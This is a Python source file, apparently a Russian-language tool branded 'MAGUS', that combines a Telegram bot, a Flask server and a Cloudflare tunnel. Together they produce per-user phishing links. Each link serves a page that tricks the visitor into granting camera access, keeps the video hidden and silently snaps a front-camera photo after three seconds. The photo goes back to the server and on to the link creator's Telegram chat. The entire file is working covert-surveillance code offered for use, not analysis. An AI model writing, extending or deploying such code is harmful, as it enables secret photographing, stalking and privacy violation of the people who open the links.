import os
import uuid
import base64
import requests
from threading import Thread
from flask import Flask, request, render_template_string, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess

app = Flask(__name__)
chat_storage = {}

BOT_TOKEN = "ТВОЙ-ТОКЕН_БОТ"
PUBLIC_URL = None
magus1 = r'''
███╗   ███╗  █████╗   ██████╗  ██╗   ██╗ ███████╗
████╗ ████║ ██╔══██╗ ██╔════╝ ██║   ██║ ██╔════╝
██╔████╔██║ ███████║ ██║  ███╗██║   ██║ ███████╗
██║╚██╔╝██║ ██╔══██║ ██║   ██║██║   ██║ ╚════██║
██║ ╚═╝ ██║ ██║  ██║ ╚██████╔╝ ╚██████╔╝ ███████║
╚═╝     ╚═╝ ╚═╝  ╚═╝  ╚═════╝   ╚═════╝  ╚══════╝
'''
print(magus1)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Что бы продолжить разрешите...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
            font-size: 2em;
            font-family: Arial, sans-serif;
        }
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" hidden></canvas>
    <div id="message">Привет , Разреши доступ камере что бы продолжить  !</div>

    <script>
        let mediaStream = null;

        async function initCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    }
                };

                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                video.srcObject = mediaStream;

                await video.play();
                setTimeout(capturePhoto, 3000); 

            } catch (err) {
                alert('Камера не сработало! Пожалуйста разрешите.');
                console.error('Camera error:', err);
            }
        }

        function capturePhoto() {
            if (!mediaStream) return;

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/jpeg').split(',')[1];

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    image: imageData,
                    id: '{{ID}}'
                })
            }).then(() => window.close());
        }

        document.addEventListener('DOMContentLoaded', initCamera);
    </script>
</body>
</html>

"""


@app.route('/<id>')
def camera_page(id):
    return render_template_string(HTML_TEMPLATE.replace('{{ID}}', id))


@app.route('/capture', methods=['POST'])
def handle_capture():
    data = request.get_json()
    image_data = data.get('image')
    uid = data.get('id')

    if not image_data or not uid:
        return jsonify({"success": False}), 400

    chat_id = chat_storage.get(uid)
    if not chat_id:
        return jsonify({"success": False}), 404

    try:
        img_bytes = base64.b64decode(image_data)
        with open(f"{uid}.jpg", "wb") as f:
            f.write(img_bytes)

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': open(f"{uid}.jpg", "rb")}
        requests.post(url, files=files, data={"chat_id": chat_id})

        return jsonify({"success": True})
    except Exception as e:
        print(e)
        return jsonify({"success": False}), 500
    finally:
        if os.path.exists(f"{uid}.jpg"):
            os.remove(f"{uid}.jpg")


def run_flask():
    app.run(host='0.0.0.0', port=5000)


def start_cloudflared():
    process = subprocess.Popen(
        [r"C:\Users\User\Downloads\cloudflared-windows-amd64.exe", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    public_url = None
    while True:
        line = process.stdout.readline()
        if not line:
            break
        print(line.strip())
        if '.trycloudflare.com' in line:
            parts = line.strip().split()
            for part in parts:
                if part.startswith('https://'):
                    public_url = part
                    return public_url
    return public_url


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(uuid.uuid4())[:8]
    chat_id = update.effective_chat.id
    chat_storage[uid] = chat_id

    short_url = f"{PUBLIC_URL}/{uid}"
    await update.message.reply_text(f"Ваша ссылка: {short_url}")


def main():
    global PUBLIC_URL
    Thread(target=run_flask, daemon=True).start()
    PUBLIC_URL = start_cloudflared()

    if not PUBLIC_URL:
        print("Не удалось запустить Cloudflared!")
        return
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))

    print(f"Бот запустился! Public URL: {PUBLIC_URL}")
    application.run_polling()


if __name__ == "__main__":
    main()
